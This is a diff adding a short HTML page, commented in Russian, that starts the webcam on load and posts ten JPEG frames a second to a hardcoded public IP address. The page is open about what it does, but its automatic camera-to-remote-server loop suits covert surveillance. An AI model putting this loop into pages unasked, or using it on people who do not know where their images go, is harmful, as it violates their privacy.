@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head><title>Камера отправка</title></head>
+<body>
+  <video id="video" autoplay muted playsinline style="width:320px;"></video>
+  <script>
+    async function startCameraAndSend() {
+      const video = document.getElementById('video');
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Канвас для захвата кадров
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        setInterval(() => {
+          if (video.videoWidth > 0 && video.videoHeight > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+              // Отправляем POST запрос с кадром на сервер по публичному IP
+              fetch('http://85.28.47.165:3000/upload', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'image/jpeg'
+                },
+                body: blob
+              }).catch(console.error);
+            }, 'image/jpeg', 0.8);
+          }
+        }, 100); // 10 кадров в секунду
+      } catch (err) {
+        console.error('Ошибка доступа к камере:', err);
+      }
+    }
+
+    startCameraAndSend();
+  </script>
+</body>
+</html>
